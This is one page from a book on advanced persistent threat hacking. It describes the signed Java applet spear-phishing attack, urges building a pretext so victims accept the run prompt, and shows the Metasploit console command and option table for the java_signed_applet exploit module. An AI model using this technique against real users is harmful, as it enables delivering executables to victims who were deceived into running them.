<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE html><html xmlns="http://www.w3.org/1999/xhtml"><head><title/><link rel="stylesheet" href="../css/base.min.css"/><link rel="stylesheet" href="../css/fancy.min.css"/><link rel="stylesheet" href="../css/pdf.css"/><meta name="viewport" content="width=640, height=824"/></head><body><div id="page_body"><div id="pfdd" class="pf w2 h2" data-page-no="dd"><div class="pc pcdd w2 h2"><div class="t m0 xbe h10 y83 ff1 fs9 fc0 sc0 lsa ws0">198<span class="_ _d"> </span><span class="ff2 fs2 ls8">Advanced Persistent Threat Hacking<span class="_ _1e"/> </span></div><div class="t m0 x3 h7 y328 ff1 fs3 fc0 sc0 ls0 ws0">Signed Java Applet</div><div class="t m0 x3 hd y329 ff4 fs7 fc0 sc0 ls1a ws0">The signed Jav<span class="_ _0"/>a applet attack is one of the most ef<span class="_ _0"/>fecti<span class="_ _0"/>ve bro<span class="_ _0"/>wser<span class="_ _0"/>-based spear-<span class="ls0">phishing </span></div><div class="t m0 x3 hd y32a ff4 fs7 fc0 sc0 ls0 ws0">attacks in the <span class="_ _2"/>APT hacker’<span class="_ _0"/>s arsenal today<span class="_ _3"/>. This attack essentially lets you deli<span class="_ _0"/>ver an </div><div class="t m0 x3 hd y1514 ff4 fs7 fc0 sc0 ls0 ws0">arbitrary ex<span class="_ _0"/>ecutable to an end user via their web bro<span class="_ _0"/>wser as a Jav<span class="_ _0"/>a app; it simply </div><div class="t m0 x3 hd y1515 ff4 fs7 fc0 sc0 ls0 ws0">relies on the user accepting a dialog like the one sho<span class="_ _0"/>wn earlier in Figure 6-2.</div><div class="t m0 x4 hd y1516 ff4 fs7 fc0 sc0 ls0 ws0">At the point when the user has to decide whether to accept the warning and run </div><div class="t m0 x3 hd y1517 ff4 fs7 fc0 sc0 ls0 ws0">the Jav<span class="_ _0"/>a applet, there should be almost zero hesitation as long as we ha<span class="_ _0"/>ve b<span class="_ _0"/>uilt our </div><div class="t m0 x3 hd y1518 ff4 fs7 fc0 sc0 ls0 ws0">story correctly<span class="_ _2"/>. Remember Sun Tzu said that e<span class="_ _0"/>very battle is w<span class="_ _0"/>on before it is fought. </div><div class="t m0 x3 hd y1519 ff4 fs7 fc0 sc0 ls0 ws0">T<span class="_ _3"/>o execute the attack, open an msfconsole session and select the e<span class="_ _0"/>xploit as in the </div><div class="t m0 x3 hd y151a ff4 fs7 fc0 sc0 ls0 ws0">follo<span class="_ _0"/>wing example:</div><div class="t m0 x3 h40 y151b fff fs5 fc0 sc0 ls28 ws4">msf auxiliary(browser_autopwn) &gt; use exploit/multi/browser/java_signed_applet </div><div class="t m0 x3 h40 y151c fff fs5 fc0 sc0 ls28 ws0">msf exploit(java_signed_applet) &gt; show options</div><div class="t m0 x3 h40 y151d fff fs5 fc0 sc0 ls28 ws0">Module options (exploit/multi/browser/java_signed_applet):</div><div class="t m0 x3 h40 y151e fff fs5 fc0 sc0 ls28 ws0">   Name            Current Setting  Required  Description</div><div class="t m0 x3 h40 y151f fff fs5 fc0 sc0 ls28 ws0">   ----            ---------------  --------  -----------</div><div class="t m0 x3 h40 y1520 fff fs5 fc0 sc0 ls28 ws0">   APPLETNAME      SiteLoader       yes       The main applet’s class name.</div><div class="t m0 x3 h40 y1521 fff fs5 fc0 sc0 ls28 ws4">   CERTCN          SiteLoader       yes       The CN= value for the </div><div class="t m0 x3 h40 y1522 fff fs5 fc0 sc0 ls28 ws0">certificate. Cannot contain ',' or '/'</div><div class="t m0 x3 h40 y1523 fff fs5 fc0 sc0 ls28 ws4">   SRVHOST         0.0.0.0          yes       The local host to listen on. </div><div class="t m0 x3 h40 y1524 fff fs5 fc0 sc0 ls28 ws0">This must be an address on the local machine or 0.0.0.0</div><div class="t m0 x3 h40 y1525 fff fs5 fc0 sc0 ls28 ws0">   SRVPORT         8080             yes       The local port to listen on.</div><div class="t m0 x3 h40 y1526 fff fs5 fc0 sc0 ls28 ws4">   SSL             false            no        Negotiate SSL for incoming </div><div class="t m0 x3 h40 y1527 fff fs5 fc0 sc0 ls28 ws4">connections</div><div class="t m0 x3 h40 y1528 fff fs5 fc0 sc0 ls28 ws4">   SSLCert                          no        Path to a custom SSL </div><div class="t m0 x3 h40 y1529 fff fs5 fc0 sc0 ls28 ws0">certificate (default is randomly generated)</div><div class="t m0 x3 h40 y152a fff fs5 fc0 sc0 ls28 ws4">   SSLVersion      SSL3             no        Specify the version of SSL that </div><div class="t m0 x3 h40 y152b fff fs5 fc0 sc0 ls28 ws0">should be used (accepted: SSL2, SSL3, TLS1)</div><div class="t m0 x3 h40 y152c fff fs5 fc0 sc0 ls28 ws4">   SigningCert                      no        Path to a signing certificate </div><div class="t m0 x3 h40 y152d fff fs5 fc0 sc0 ls28 ws0">in PEM or PKCS12 (.pfx) format</div><div class="t m0 x3 h40 y152e fff fs5 fc0 sc0 ls28 ws4">   SigningKey                       no        Path to a signing key in PEM </div><div class="t m0 x3 h40 y152f fff fs5 fc0 sc0 ls28 ws4">format</div><div class="t m0 x3 h40 y1530 fff fs5 fc0 sc0 ls28 ws4">   SigningKeyPass                   no        Password for signing key </div><div class="t m0 x3 h40 y1531 fff fs5 fc0 sc0 ls28 ws0">(required if SigningCert is a .pfx)</div><div class="t m0 x3 h40 y1532 fff fs5 fc0 sc0 ls28 ws4">   URIPATH                          no        The URI to use for this exploit </div><div class="t m0 x3 h40 y1533 fff fs5 fc0 sc0 ls28 ws0">(default is random)</div><div class="t m0 x3 h40 y1534 fff fs5 fc0 sc0 ls28 ws0">Exploit target:</div><div class="t m0 x3 h40 y1535 fff fs5 fc0 sc0 ls28 ws0">   Id  Name</div><div class="t m0 x3 h40 y1536 fff fs5 fc0 sc0 ls28 ws0">   --  ----</div><div class="t m0 x3 h40 y1537 fff fs5 fc0 sc0 ls28 ws0">   1   Windows x86 (Native Payload)</div><div class="t m0 x3 h40 y1538 fff fs5 fc0 sc0 ls29 ws2f">msf exploit(java_signed_applet) &gt; </div></div><div class="pi" data-data="{&#34;ctm&#34;:[1.209373,0.000000,0.000000,1.209373,0.000000,0.000000]}"/></div></div></body></html>